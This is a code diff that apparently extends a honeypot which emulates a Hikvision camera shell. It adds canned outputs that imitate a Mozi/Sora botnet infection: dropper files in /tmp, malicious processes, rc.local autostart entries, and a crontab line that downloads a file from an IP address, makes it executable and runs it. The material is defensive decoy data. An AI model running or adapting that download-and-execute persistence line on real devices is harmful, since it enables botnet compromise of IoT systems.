@@ -241,11 +241,11 @@ _FS = {
 _DIRS = {
     "/":          "bin  dev  etc  home  lib  mnt  proc  root  sbin  sys  tmp  usr  var\n",
     "/etc":       "group  hikvision.conf  hostname  hosts  issue  motd  os-release  passwd  shadow\n",
-    "/root":      ".bash_history  .env  .ssh\n",
+    "/root":      ".bash_history  .env  .ssh  passwords.txt  .dvr_config\n",
     "/root/.ssh": "authorized_keys  known_hosts\n",
     "/mnt":       "dvr\n",
     "/mnt/dvr":   "config  recordings\n",
-    "/tmp":       "\n",
+    "/tmp":       ".sora  mozi.m  kworker  .X11-unix  arm  arm7  mips  mpsl  .dropper  .update  bot.sh\n",
     "/bin":       "ash  busybox  cat  chmod  cp  df  echo  grep  kill  ls  mkdir  mount  mv  ps  rm  sh  uname\n",
     "/usr/bin":   "curl  env  find  id  top  wget  whoami\n",
     "/sbin":      "ifconfig  init  reboot  syslogd\n",
@@ -286,6 +286,9 @@ _CMD = {
         "  456 root      8192 S    /usr/bin/ipc_server\n"
         "  567 root     16384 S    /usr/bin/rtsp_server\n"
         "  678 root      2048 S    /bin/sh\n"
+        "  789 root      3072 S    /tmp/mozi.m\n"
+        "  790 root      2048 S    /tmp/.sora\n"
+        "  791 root      1024 S    /bin/sh -c /tmp/mozi.m\n"
         "  999 root       512 R    ps\n"
     ),
     "ps aux": (
@@ -354,6 +357,72 @@ _CMD = {
         "LISTEN   0      128           *:80            *:*      users:((\"httpd\",pid=345))\n"
         "LISTEN   0      128           *:554           *:*      users:((\"rtsp\",pid=567))\n"
     ),
+    "top": (
+        "Mem: 57344K used, 4096K free, 0K shrd, 1024K buff, 12288K cached\n"
+        "CPU:  28% usr  5% sys  0% nic  67% idle\n"
+        "Load average: 0.12 0.08 0.05\n\n"
+        "  PID  PPID USER     STAT   VSZ %MEM %CPU COMMAND\n"
+        "  456     1 root     S    16384  3.1 12.8 /usr/bin/rtsp_server\n"
+        "  345     1 root     S     4096  0.8  8.2 /usr/sbin/httpd\n"
+        "  789     1 root     S     3072  0.6  4.1 /tmp/mozi.m\n"
+        "  790     1 root     S     2048  0.4  2.3 /tmp/.sora\n"
+        "  234     1 root     S     3072  0.6  0.1 /usr/sbin/sshd\n"
+        "  123     1 root     S     2048  0.4  0.0 /sbin/syslogd\n"
+        "    1     0 root     S     1040  0.2  0.0 init\n"
+    ),
+    "lsmod": (
+        "Module                  Size  Used by\n"
+        "hi3518e_isp            45678  1\n"
+        "hi3518e_venc           56789  1\n"
+        "hi3518e_h264e          89012  1 hi3518e_venc\n"
+        "hidmac                  9876  1\n"
+        "hifb                   22222  0\n"
+    ),
+    "iptables -L": (
+        "Chain INPUT (policy ACCEPT)\n"
+        "target     prot opt source               destination\n\n"
+        "Chain FORWARD (policy ACCEPT)\n"
+        "target     prot opt source               destination\n\n"
+        "Chain OUTPUT (policy ACCEPT)\n"
+        "target     prot opt source               destination\n"
+    ),
+    "dmesg": (
+        "[    0.000000] Linux version 3.10.14 (builder@hikvision) (gcc 4.8.3)\n"
+        "[    0.000000] CPU: ARMv7 Processor [410fc074] revision 4\n"
+        "[    0.000000] Machine: Hikvision IPCamera\n"
+        "[    1.024000] eth0: Hikvision MAC at 0xfe100000\n"
+        "[    1.408000] VFS: Mounted root (squashfs filesystem) readonly\n"
+        "[    1.536000] hi3518e_isp: module loaded\n"
+        "[    2.048000] ipcam: started, model DS-2CD2043G2-I\n"
+    ),
+    "cat /proc/net/arp": (
+        "IP address       HW type     Flags       HW address            Mask     Device\n"
+        "192.168.1.1      0x1         0x2         a4:b1:c8:22:34:56     *        eth0\n"
+        "192.168.1.50     0x1         0x2         00:0c:29:ab:cd:ef     *        eth0\n"
+        "192.168.1.99     0x1         0x2         b8:27:eb:12:34:56     *        eth0\n"
+        "192.168.1.200    0x1         0x2         dc:a6:32:88:77:66     *        eth0\n"
+    ),
+    "cat /proc/net/tcp": (
+        "  sl  local_address rem_address   st\n"
+        "   0: 00000000:0016 00000000:0000 0A\n"
+        "   1: 00000000:0050 00000000:0000 0A\n"
+        "   2: 00000000:0017 00000000:0000 0A\n"
+    ),
+    "cat /etc/rc.local": (
+        "#!/bin/sh\n"
+        "# rc.local\n"
+        "/usr/bin/ipcam -c /etc/dvr.conf &\n"
+        "/tmp/.sora &\n"
+        "/tmp/mozi.m &\n"
+        "exit 0\n"
+    ),
+    "crontab -l": (
+        "# DO NOT EDIT — installed by /tmp/crontab.X4fK8z\n"
+        "*/30 * * * * /bin/busybox wget -q http://45.33.32.156/update -O /tmp/.update "
+        "&& chmod 777 /tmp/.update && /tmp/.update\n"
+        "@reboot /tmp/.sora\n"
+        "@reboot /tmp/mozi.m\n"
+    ),
     "free":   (
         "             total       used       free     shared    buffers     cached\n"
         "Mem:        524288     396288     128000          0      16384      98304\n"
@@ -385,30 +454,10 @@ _CMD = {
         "tmpfs on /tmp type tmpfs (rw,relatime)\n"
         "/dev/mtdblock5 on /mnt/dvr type ext4 (rw,relatime)\n"
     ),
-    "dmesg": (
-        "[    0.000000] Linux version 3.10.14 (builder@hikvision)\n"
-        "[    0.000000] CPU: ARMv7 Processor [410fc075] revision 5 (ARMv7)\n"
-        "[    1.234567] Hikvision IPCamera platform initialized\n"
-        "[    2.345678] eth0: link up, 100Mbps, full-duplex\n"
-        "[    3.456789] RTSP server starting on port 554\n"
-        "[    4.567890] HTTP server starting on port 80\n"
-        "[    5.678901] Camera module initialized: DS-2CD2043G2-I\n"
-        "[    6.789012] Recording service started\n"
-        "[    7.890123] ONVIF service ready on port 8000\n"
-    ),
     "dmesg | tail": (
         "[    5.678901] Camera module initialized: DS-2CD2043G2-I\n"
         "[    6.789012] Recording service started\n"
         "[    7.890123] ONVIF service ready on port 8000\n"
-    ),
-    "top": (
-        "Mem: 396288K used, 128000K free, 16384K shrd, 98304K buff, 81920K cached\n"
-        "CPU:  1% usr  0% sys  0% nic 98% idle  0% io  0% irq  0% sirq\n"
-        "Load average: 0.12 0.08 0.05\n\n"
-        "  PID  PPID USER     STAT   VSZ %VSZ CPU %CPU COMMAND\n"
-        "  456     1 root     S     8192   1%   0  1.2 ipc_server\n"
-        "  567     1 root     S    16384   3%   0  0.8 rtsp_server\n"
-        "  234     1 root     S     3072   0%   0  0.1 sshd\n"
     ),
     "w": (
         " 10:00:00 up 45 days,  3:21,  1 user,  load average: 0.12, 0.08, 0.05\n"
@@ -433,15 +482,7 @@ _CMD = {
     "cat /etc/motd":     "Welcome to Hikvision IP Camera\nFirmware: V5.7.15 build 230313\n",
     "cat /etc/issue":    "Hikvision Embedded Linux\n",
     "cat /etc/hostname": "IPC\n",
-    "iptables -L":       "Chain INPUT (policy ACCEPT)\nChain FORWARD (policy ACCEPT)\nChain OUTPUT (policy ACCEPT)\n",
     "iptables -nL":      "Chain INPUT (policy ACCEPT)\nChain FORWARD (policy ACCEPT)\nChain OUTPUT (policy ACCEPT)\n",
-    "crontab -l":        "no crontab for root\n",
-    "lsmod": (
-        "Module                  Size  Used by\n"
-        "hi3516cv500_isp       524288  0\n"
-        "hi_mipi               131072  0\n"
-        "hi3516cv500_base       65536  2\n"
-    ),
     "find / -name '*.conf' 2>/dev/null": (
         "/etc/hikvision.conf\n/etc/resolv.conf\n/etc/network.conf\n"
     ),
